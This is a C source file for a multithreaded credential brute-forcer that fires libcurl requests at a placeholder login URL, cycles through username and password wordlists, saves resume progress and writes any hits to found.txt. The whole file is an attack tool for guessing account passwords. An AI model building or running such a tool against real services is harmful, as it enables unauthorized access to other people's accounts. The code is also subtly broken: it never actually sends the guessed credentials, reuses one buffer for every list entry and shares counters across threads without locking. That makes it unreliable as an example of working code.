#include <stdio.h>
#include <curl/curl.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>  
#include <pthread.h>
#include<stdbool.h>

#define  LENGTH_REPONSE  130
#define URL "http://urlforbrutefoce"

static int count_u = 0;
static int max_length_user= 0;
static int max_length_pass=0;
static char **list_user ;
static char **list_pass ;

struct url_data {
    size_t size;
    char* data;
};

size_t write_data(void *ptr, size_t size, size_t nmemb, struct url_data *data) {
    size_t index = data->size;
    size_t n = (size * nmemb);
    char* tmp;
    data->size += (size * nmemb);

#ifdef DEBUG
    fprintf(stderr, "data at %p size=%ld nmemb=%ld\n", ptr, size, nmemb);
#endif
    tmp = realloc(data->data, data->size + 1); /* +1 for '\0' */

    if(tmp) {
        data->data = tmp;
    } else {
        if(data->data) {
            free(data->data);
        }
        fprintf(stderr, "Failed to allocate memory.\n");
        return 0;
    }

    memcpy((data->data + index), ptr, n);
    data->data[data->size] = '\0';

    return size * nmemb;
}
void found(char * buffer){
    FILE *fptr;
    fptr = fopen("found.txt","a");
    fwrite(buffer,strlen(buffer),1,fptr);
    fclose(fptr);
}
void save(char * filename,int n){
    FILE * fp;
    char * line = NULL;
    size_t len = 0;
    char str[10];
    snprintf( str, 10, "%d", n);
    fp = fopen(filename, "w");
    if (fp == NULL){
        printf("Error");
        exit(EXIT_FAILURE);
    }
    fputs(str,fp);
    fclose(fp);
}
char *handle_url(char* url) {
    CURL *curl;

    struct url_data data;
    data.size = 0;
    data.data = malloc(1024);
    if(NULL == data.data) {
        fprintf(stderr, "Failed to allocate memory.\n");
        return NULL;
    }

    data.data[0] = '\0';

    CURLcode res;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n",  
                        curl_easy_strerror(res));
        }

        curl_easy_cleanup(curl);

    }
    return data.data;
}
void *myThreadFun(void *port)
{
    int *myid = (int *)port;
    int i,count_p=0;
    char* data,*u,*p;
    while (count_u<max_length_user)
    {
        count_p=0;
        u=list_user[count_u];

        while (count_p<max_length_pass)
        {
            p=list_pass[count_p];
            bool isFound= false;
            data = handle_url(URL);
            if(data) {
            for(i=0;i<LENGTH_REPONSE ;i++){
                if(data[i]=='1'){
                    isFound=true;
                    break;
                    }
            if(isFound){
                char ok[49] ;
                sprintf(ok,"%s:%s\n",u,p);
                found(ok);
                break;
            }
                    }
            free(data);
                    }
            count_p++;
        }
        count_u++;
        save("count.txt",count_u);
        
        /* code */
    }
    
}
int restoreCount(char* filename){
    FILE * fp;
    char * line = NULL;
    size_t len = 0;
    int count=0;
    fp = fopen(filename, "r");
    getline(&line, &len, fp);
    count=atoi(line);
    fclose(fp);
    return count;
}
//return length of array
int loadList(char* filename,char ***list){
    FILE * fp,*count;
    char * line = NULL;
    size_t len = 0;
    ssize_t read;
    int count_length=0,i=0,restore=0;
    
    count = fopen(filename, "r");
    if (count == NULL){
        printf("Error");
        exit(EXIT_FAILURE);
    }
    while ((read = getline(&line, &len, count)) != -1) {
        if(restore<count_u) {restore++;continue;}
        count_length++;
    }
    fclose(count);
    //cung cap bo nho cho list
    for ( i = 0; i < count_length; i++)
    {
        *list = malloc( count_length* sizeof(char *));
    }
    
    fp = fopen(filename, "r");
    i=0;
    restore=0;
    while ((read = getline(&line, &len, fp)) != -1) {
        if(restore<count_u) {restore++;continue;}
        line[read-1]='\0';
        (*list)[i]=line;
        i++;
    }
    fclose(fp);

    if (line)
        free(line);
    return count_length;
}

int main(int argc, char* argv[]) {
    int i;
    const int port= 10;
    pthread_t tid [port];
    int arr[port];
    count_u= restoreCount("count.txt");    
    max_length_user= loadList("hihi.txt",&list_user);
    max_length_pass= loadList("hihi.txt",&list_pass);

    for (size_t i = 0; i < port; i++)
    {
        arr[i]=i;
    }
    
    for (i = 0; i < port; i++){

        pthread_create(&tid[i], NULL, myThreadFun, (void *)(arr+i));
    }
     for (i = 0; i < port; i++){

        pthread_join(tid[i],NULL);
    }
    
    return 0;
}